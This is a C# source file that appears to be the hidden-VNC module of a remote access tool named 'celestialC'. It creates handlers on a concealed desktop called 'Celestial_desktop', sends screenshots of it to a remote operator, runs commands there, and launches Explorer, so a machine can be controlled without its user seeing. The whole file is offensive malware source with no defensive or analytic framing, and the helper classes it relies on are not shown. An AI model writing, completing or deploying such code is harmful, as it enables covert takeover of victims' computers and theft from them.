using celestialC.Helper.Services.compression;
using DesktopDuplication;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace celestialC.Helper.hVNC
{
    static class hVNC
    {
        static Imaging_handler ImageHandler;
        static Process_Handler ProcessHandler;
       public static input_handler InputHandler;
        public static bool Init()
        {
            try
            {
                ImageHandler = new Imaging_handler("Celestial_desktop");
                ProcessHandler = new Process_Handler("Celestial_desktop");
                InputHandler = new input_handler("Celestial_desktop");
                return true;
            }
            catch
            {
                return false;
            }
        }
        public static void SendScreenShot(IStreamCodec streamCodec)
        {
            byte[] scbyte = ImageHandler.Screenshot(streamCodec);
            if (scbyte != null)
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add(22);
                ToSend.AddRange(scbyte);
                PacketSender.Send(ToSend.ToArray());
            }
        }
        public static void CreateProcc(string cmd)
        {
            ProcessHandler.CreateProc(cmd);
        }
        public static void StartExpl()
        {
            ProcessHandler.StartExplorer();
        }
        public static void Dispose()
        {
            ImageHandler?.Dispose();
            InputHandler?.Dispose();
            GC.Collect();
        }


    }
}
